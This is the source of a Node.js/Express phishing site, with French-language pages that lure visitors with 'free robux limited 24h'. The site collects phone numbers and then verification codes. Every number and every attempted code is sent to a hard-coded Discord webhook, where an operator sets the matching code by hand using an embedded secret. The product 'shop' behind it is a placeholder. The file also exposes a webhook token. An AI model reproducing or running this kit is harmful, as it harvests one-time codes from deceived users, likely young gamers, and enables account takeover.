const express = require('express');
const app = express();
app.use(express.json());

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1558081505731940452/UeJFc9XT30G1S9xAdD6qVBctjcZLYpP-bIwhouR6YJIp7lTKezsCdKdpUzHd0xIhRzYb';
const ADMIN_SECRET    = 'lovego2025';

const activeCodes    = new Map();
const verifiedTokens = new Set();

async function notifyDiscord(embed) {
  try {
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) { console.error('Webhook:', e.message); }
}

// Étape 1 — reçoit le numéro
app.post('/api/phone', async (req, res) => {
  const { phone } = req.body;
  if (!phone || phone.length < 6) return res.status(400).json({ error: 'Numéro invalide' });
  await notifyDiscord({
    title: '📱 Nouveau numéro reçu',
    description: `**Numéro :** \`${phone}\`\nSet le code avec :\n\`\`\`\nPOST /api/set-code\n{"phone":"${phone}","code":"XXXXXX","secret":"lovego2025"}\n\`\`\``,
    color: 0x6366F1,
    timestamp: new Date().toISOString(),
    footer: { text: 'free robux limited 24h ' }
  });
  res.json({ success: true });
});

// Étape 2 — set le code (4 ou 6 chiffres uniquement)
app.post('/api/set-code', (req, res) => {
  const { phone, code, secret } = req.body;
  if (secret !== ADMIN_SECRET) return res.status(403).json({ error: 'Refusé' });
  const codeStr = String(code);
  if (codeStr.length !== 4 && codeStr.length !== 6) {
    return res.status(400).json({ error: 'Code doit être 4 ou 6 chiffres' });
  }
  activeCodes.set(phone, { code: codeStr, expires: Date.now() + 10 * 60 * 1000 });
  res.json({ success: true });
});

// Étape 3 — user entre son code → Discord affiche toujours ce qu'il a tapé
app.post('/api/verify', async (req, res) => {
  const { phone, code } = req.body;
  if (!phone || !code) return res.status(400).json({ error: 'Données manquantes' });

  const codeStr = String(code);

  // Validation longueur côté user aussi
  if (codeStr.length !== 4 && codeStr.length !== 6) {
    await notifyDiscord({
      title: '⚠️ Code invalide',
      description: `**Numéro :** \`${phone}\`\n**Code tenté :** \`${codeStr}\`\nLongueur incorrecte (${codeStr.length} chiffres).`,
      color: 0xF59E0B,
      timestamp: new Date().toISOString(),
      footer: { text: 'Running Link Lovego' }
    });
    return res.status(400).json({ error: 'Code doit être 4 ou 6 chiffres' });
  }

  const entry = activeCodes.get(phone);

  // Numéro pas trouvé
  if (!entry) {
    await notifyDiscord({
      title: '⚠️ Numéro inconnu',
      description: `**Numéro :** \`${phone}\`\n**Code tenté :** \`${codeStr}\`\nAucun code actif pour ce numéro.`,
      color: 0xF59E0B,
      timestamp: new Date().toISOString(),
      footer: { text: 'Running Link Lovego' }
    });
    return res.status(400).json({ error: 'Numéro non trouvé' });
  }

  // Code expiré
  if (Date.now() > entry.expires) {
    activeCodes.delete(phone);
    await notifyDiscord({
      title: '⏱️ Code expiré',
      description: `**Numéro :** \`${phone}\`\n**Code tenté :** \`${codeStr}\``,
      color: 0xF59E0B,
      timestamp: new Date().toISOString(),
      footer: { text: 'Running Link Lovego' }
    });
    return res.status(400).json({ error: 'Code expiré' });
  }

  // Mauvais code
  if (entry.code !== codeStr) {
    await notifyDiscord({
      title: '❌ Mauvais code',
      description: `**Numéro :** \`${phone}\`\n**Code attendu :** \`${entry.code}\`\n**Code tenté :** \`${codeStr}\``,
      color: 0xEF4444,
      timestamp: new Date().toISOString(),
      footer: { text: 'Running Link Lovego' }
    });
    return res.status(400).json({ error: 'Code incorrect' });
  }

  // Bon code
  const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
  verifiedTokens.add(token);
  activeCodes.delete(phone);
  await notifyDiscord({
    title: '✅ Accès accordé',
    description: `**Numéro :** \`${phone}\`\n**Code utilisé :** \`${codeStr}\``,
    color: 0x22C55E,
    timestamp: new Date().toISOString(),
    footer: { text: 'Running Link Lovego' }
  });
  res.json({ success: true, token });
});

// Check token
app.get('/api/check-token', (req, res) => {
  const token = req.headers['x-access-token'];
  if (token && verifiedTokens.has(token)) return res.json({ valid: true });
  res.status(401).json({ valid: false });
});

const VERIFY_PAGE = `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>free robux limited 24h</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{--bg:#03030f;--surface:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.08);--accent:#6366f1;--glow:rgba(99,102,241,0.35);--gold:#f59e0b;--text:#e8e8f0;--muted:#6b6b80;--err:#ef4444;--ok:#22c55e}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:'Space Grotesk',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;position:relative}
#c{position:fixed;inset:0;z-index:0;pointer-events:none}
.nb{position:fixed;border-radius:50%;filter:blur(90px);pointer-events:none;z-index:0}
.n1{width:500px;height:500px;background:radial-gradient(circle,rgba(99,102,241,0.12) 0%,transparent 70%);top:-150px;left:-150px}
.n2{width:400px;height:400px;background:radial-gradient(circle,rgba(245,158,11,0.07) 0%,transparent 70%);bottom:-100px;right:-100px}
.w{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;gap:28px;padding:24px;width:100%;max-width:400px}
.logo{text-align:center}
.li{font-size:2.2rem;display:block;margin-bottom:8px;filter:drop-shadow(0 0 14px var(--gold))}
.ln{font-size:1.45rem;font-weight:700;letter-spacing:-0.02em;background:linear-gradient(135deg,#fff 30%,var(--accent) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.ls{font-size:0.75rem;color:var(--muted);margin-top:4px;letter-spacing:0.08em;text-transform:uppercase}
.card{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:32px 28px;backdrop-filter:blur(16px);box-shadow:0 24px 64px rgba(0,0,0,0.5),0 0 40px var(--glow)}
.ct{font-size:1.1rem;font-weight:600;margin-bottom:6px}
.cd{font-size:0.82rem;color:var(--muted);margin-bottom:24px;line-height:1.5}
label{display:block;font-size:0.72rem;font-weight:500;color:var(--muted);margin-bottom:7px;letter-spacing:0.04em;text-transform:uppercase}
input{width:100%;background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:10px;padding:13px 15px;color:var(--text);font-family:'Space Grotesk',sans-serif;font-size:1rem;outline:none;transition:border-color .2s,box-shadow .2s;margin-bottom:14px}
input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--glow)}
input::placeholder{color:var(--muted)}
button{width:100%;background:var(--accent);border:none;border-radius:10px;padding:13px;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:600;cursor:pointer;transition:opacity .2s,box-shadow .2s;box-shadow:0 4px 24px var(--glow)}
button:hover{opacity:.88}
button:active{transform:scale(0.98)}
button:disabled{opacity:.45;cursor:not-allowed}
.msg{margin-top:12px;font-size:0.82rem;min-height:18px;text-align:center}
.err{color:var(--err)}.ok{color:var(--ok)}
#s2{display:none}
.hint{font-size:0.78rem;color:var(--muted);text-align:center;margin-top:10px}
.hint span{color:var(--accent);cursor:pointer}
.foot{font-size:0.7rem;color:var(--muted);text-align:center}
.foot span{color:var(--gold)}
.sp{width:15px;height:15px;border:2px solid rgba(255,255,255,0.25);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<canvas id="c"></canvas>
<div class="nb n1"></div><div class="nb n2"></div>
<div class="w">
  <div class="logo">
    <span class="li">✦</span>
    <div class="ln">free robux limitee24h</div>
    <div class="ls">Accès sécurisé</div>
  </div>
  <div class="card">
    <div id="s1">
      <div class="ct">Entre ton numéro</div>
      <div class="cd">Tu recevras un code pour accéder au shop.</div>
      <label>Numéro de téléphone</label>
      <input type="tel" id="phone" placeholder="+33 6 00 00 00 00">
      <button id="b1" onclick="sendPhone()"><span id="b1i">Envoyer le code</span></button>
      <div class="msg" id="m1"></div>
    </div>
    <div id="s2">
      <div class="ct">Entre le code</div>
      <div class="cd">Code 4 ou 6 chiffres — valable 10 minutes.</div>
      <label>Code de vérification</label>
      <input type="text" id="code" placeholder="• • • •  /  • • • • • •" maxlength="6" inputmode="numeric">
      <button id="b2" onclick="verifyCode()"><span id="b2i">Vérifier l'accès</span></button>
      <div class="hint">Mauvais numéro ? <span onclick="goBack()">Recommencer</span></div>
      <div class="msg" id="m2"></div>
    </div>
  </div>
  <div class="foot">Accès protégé · <span>free robux limited 24h </span> · 2025</div>
</div>
<script>
const cv=document.getElementById('c'),cx=cv.getContext('2d');let st=[],sh=[];
function resize(){cv.width=innerWidth;cv.height=innerHeight;st=[];const n=Math.floor(cv.width*cv.height/3200);for(let i=0;i<n;i++)st.push({x:Math.random()*cv.width,y:Math.random()*cv.height,r:Math.random()*1.1+0.2,a:Math.random()*0.6+0.3,s:Math.random()*0.003+0.001,p:Math.random()*Math.PI*2});}
setInterval(()=>{sh.push({x:Math.random()*cv.width*.7,y:Math.random()*cv.height*.4,l:Math.random()*110+50,sp:Math.random()*7+5,a:1,ag:Math.PI/5})},4500);
function draw(t){cx.clearRect(0,0,cv.width,cv.height);st.forEach(s=>{const a=s.a*(0.5+0.5*Math.sin(t*s.s+s.p));cx.beginPath();cx.arc(s.x,s.y,s.r,0,Math.PI*2);cx.fillStyle='rgba(255,255,255,'+a+')';cx.fill();});sh=sh.filter(s=>s.a>0.02);sh.forEach(s=>{const g=cx.createLinearGradient(s.x,s.y,s.x-Math.cos(s.ag)*s.l,s.y-Math.sin(s.ag)*s.l);g.addColorStop(0,'rgba(255,255,255,'+s.a+')');g.addColorStop(1,'rgba(255,255,255,0)');cx.beginPath();cx.moveTo(s.x,s.y);cx.lineTo(s.x-Math.cos(s.ag)*s.l,s.y-Math.sin(s.ag)*s.l);cx.strokeStyle=g;cx.lineWidth=1.5;cx.stroke();s.x+=Math.cos(s.ag)*s.sp;s.y+=Math.sin(s.ag)*s.sp;s.a-=0.017;});requestAnimationFrame(draw);}
window.addEventListener('resize',resize);resize();requestAnimationFrame(draw);
let ph='';
function setLoad(id,iid,on,lbl){document.getElementById(id).disabled=on;document.getElementById(iid).innerHTML=on?'<div class="sp"></div>':lbl;}
function msg(id,txt,cls){const e=document.getElementById(id);e.textContent=txt;e.className='msg '+cls;}
async function sendPhone(){const p=document.getElementById('phone').value.trim();if(!p)return msg('m1','Entre ton numéro.','err');setLoad('b1','b1i',true);try{const r=await fetch('/api/phone',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p})});const d=await r.json();if(d.success){ph=p;document.getElementById('s1').style.display='none';document.getElementById('s2').style.display='block';}else msg('m1',d.error||'Erreur.','err');}catch{msg('m1','Serveur inaccessible.','err');}setLoad('b1','b1i',false,'Envoyer le code');}
async function verifyCode(){
  const c=document.getElementById('code').value.trim();
  if(!c)return msg('m2','Entre le code.','err');
  if(c.length!==4&&c.length!==6)return msg('m2','Code doit être 4 ou 6 chiffres.','err');
  setLoad('b2','b2i',true);
  try{const r=await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:ph,code:c})});const d=await r.json();if(d.success){localStorage.setItem('lovego_token',d.token);msg('m2','✓ Accès accordé…','ok');setTimeout(()=>location.href='/shop',1200);}else{msg('m2',d.error||'Incorrect.','err');setLoad('b2','b2i',false,"Vérifier l'accès");}}catch{msg('m2','Serveur inaccessible.','err');setLoad('b2','b2i',false,"Vérifier l'accès");}
}
function goBack(){document.getElementById('s2').style.display='none';document.getElementById('s1').style.display='block';document.getElementById('m1').textContent='';document.getElementById('phone').value='';}
document.getElementById('code').addEventListener('keydown',e=>{if(e.key==='Enter')verifyCode();});
document.getElementById('phone').addEventListener('keydown',e=>{if(e.key==='Enter')sendPhone();});
</script>
</body></html>`;

const SHOP_PAGE = `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Running Link Lovego — Shop</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{--bg:#03030f;--surface:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.08);--accent:#6366f1;--glow:rgba(99,102,241,0.3);--gold:#f59e0b;--text:#e8e8f0;--muted:#6b6b80}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:'Space Grotesk',sans-serif;min-height:100vh;overflow-x:hidden}
#c{position:fixed;inset:0;z-index:0;pointer-events:none}
.nb{position:fixed;border-radius:50%;filter:blur(100px);pointer-events:none;z-index:0}
.n1{width:600px;height:600px;background:radial-gradient(circle,rgba(99,102,241,0.1) 0%,transparent 70%);top:-200px;right:-100px}
.n2{width:400px;height:400px;background:radial-gradient(circle,rgba(245,158,11,0.06) 0%,transparent 70%);bottom:-100px;left:-100px}
nav{position:relative;z-index:10;display:flex;align-items:center;justify-content:space-between;padding:18px 28px;border-bottom:1px solid var(--border);backdrop-filter:blur(12px)}
.nl{display:flex;align-items:center;gap:9px}
.ni{font-size:1.3rem;filter:drop-shadow(0 0 8px var(--gold))}
.nn{font-size:1rem;font-weight:700;background:linear-gradient(135deg,#fff 30%,var(--accent) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.nb2{font-size:0.7rem;color:var(--muted);background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:4px 11px}
.hero{position:relative;z-index:1;text-align:center;padding:56px 24px 40px}
.htag{display:inline-block;font-size:0.7rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--accent);border:1px solid rgba(99,102,241,0.3);border-radius:20px;padding:4px 13px;margin-bottom:18px}
.hero h1{font-size:clamp(1.7rem,5vw,2.6rem);font-weight:700;letter-spacing:-0.03em;line-height:1.15;margin-bottom:12px}
.hero h1 span{background:linear-gradient(135deg,var(--accent),var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hero p{color:var(--muted);font-size:0.9rem;max-width:400px;margin:0 auto;line-height:1.6}
.sec{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:0 24px 80px}
.sl{font-size:0.7rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);margin-bottom:18px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:16px}
.card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:22px;transition:border-color .2s,box-shadow .2s,transform .2s;cursor:pointer}
.card:hover{border-color:rgba(99,102,241,0.4);box-shadow:0 8px 32px rgba(99,102,241,0.15);transform:translateY(-2px)}
.ci{font-size:1.7rem;margin-bottom:12px;display:block}
.cn{font-size:.95rem;font-weight:600;margin-bottom:5px}
.cdesc{font-size:.8rem;color:var(--muted);line-height:1.5;margin-bottom:18px}
.cf{display:flex;align-items:center;justify-content:space-between}
.cp{font-size:1.1rem;font-weight:700;color:var(--accent)}
.cb{background:rgba(99,102,241,0.15);border:1px solid rgba(99,102,241,0.3);border-radius:7px;padding:6px 14px;color:var(--accent);font-family:'Space Grotesk',sans-serif;font-size:.8rem;font-weight:600;cursor:pointer;transition:background .2s}
.cb:hover{background:rgba(99,102,241,0.25)}
.bnew{display:inline-block;font-size:.62rem;font-weight:600;text-transform:uppercase;color:var(--gold);border:1px solid rgba(245,158,11,0.3);border-radius:4px;padding:2px 6px;margin-left:7px;vertical-align:middle}
footer{position:relative;z-index:1;text-align:center;padding:22px;border-top:1px solid var(--border);font-size:.7rem;color:var(--muted)}
footer span{color:var(--gold)}
</style>
</head>
<body>
<canvas id="c"></canvas>
<div class="nb n1"></div><div class="nb n2"></div>
<nav>
  <div class="nl"><span class="ni">✦</span><span class="nn">Running Link Lovego</span></div>
  <div class="nb2">✓ Accès vérifié</div>
</nav>
<div class="hero">
  <div class="htag">Shop exclusif</div>
  <h1>Nos <span>produits</span><br>disponibles</h1>
  <p>Accès réservé aux membres vérifiés.</p>
</div>
<div class="sec">
  <div class="sl">Catalogue</div>
  <div class="grid" id="grid"></div>
</div>
<footer>© 2025 <span>Running Link Lovego</span> · Tous droits réservés</footer>
<script>
const cv=document.getElementById('c'),cx=cv.getContext('2d');let st=[],sh=[];
function resize(){cv.width=innerWidth;cv.height=innerHeight;st=[];const n=Math.floor(cv.width*cv.height/3500);for(let i=0;i<n;i++)st.push({x:Math.random()*cv.width,y:Math.random()*cv.height,r:Math.random()*1.1+0.2,a:Math.random()*0.6+0.3,s:Math.random()*0.003+0.001,p:Math.random()*Math.PI*2});}
setInterval(()=>{sh.push({x:Math.random()*cv.width*.7,y:Math.random()*cv.height*.4,l:Math.random()*100+55,sp:Math.random()*7+5,a:1,ag:Math.PI/5})},5000);
function draw(t){cx.clearRect(0,0,cv.width,cv.height);st.forEach(s=>{const a=s.a*(0.5+0.5*Math.sin(t*s.s+s.p));cx.beginPath();cx.arc(s.x,s.y,s.r,0,Math.PI*2);cx.fillStyle='rgba(255,255,255,'+a+')';cx.fill();});sh=sh.filter(s=>s.a>0.02);sh.forEach(s=>{const g=cx.createLinearGradient(s.x,s.y,s.x-Math.cos(s.ag)*s.l,s.y-Math.sin(s.ag)*s.l);g.addColorStop(0,'rgba(255,255,255,'+s.a+')');g.addColorStop(1,'rgba(255,255,255,0)');cx.beginPath();cx.moveTo(s.x,s.y);cx.lineTo(s.x-Math.cos(s.ag)*s.l,s.y-Math.sin(s.ag)*s.l);cx.strokeStyle=g;cx.lineWidth=1.5;cx.stroke();s.x+=Math.cos(s.ag)*s.sp;s.y+=Math.sin(s.ag)*s.sp;s.a-=0.016;});requestAnimationFrame(draw);}
window.addEventListener('resize',resize);resize();requestAnimationFrame(draw);
(async()=>{const token=localStorage.getItem('lovego_token');if(!token)return location.href='/';const r=await fetch('/api/check-token',{headers:{'x-access-token':token}});const d=await r.json();if(!d.valid){localStorage.removeItem('lovego_token');location.href='/';return;}loadProducts();})();
const products=[
  {icon:'⚡',name:'Produit A',desc:'Description ici.',price:'9.99€',isNew:true},
  {icon:'🔥',name:'Produit B',desc:'Description ici.',price:'19.99€',isNew:false},
  {icon:'💎',name:'Produit C',desc:'Description ici.',price:'4.99€',isNew:false},
  {icon:'🚀',name:'Produit D',desc:'Description ici.',price:'14.99€',isNew:true},
];
function loadProducts(){document.getElementById('grid').innerHTML=products.map(p=>'<div class="card"><span class="ci">'+p.icon+'</span><div class="cn">'+p.name+(p.isNew?'<span class="bnew">Nouveau</span>':'')+'</div><div class="cdesc">'+p.desc+'</div><div class="cf"><div class="cp">'+p.price+'</div><button class="cb">Acheter</button></div></div>').join('');}
</script>
</body></html>`;

app.get('/', (req, res) => res.send(VERIFY_PAGE));
app.get('/shop', (req, res) => res.send(SHOP_PAGE));

app.listen(3000, () => console.log('🌟 Running Link Lovego live :3000'));
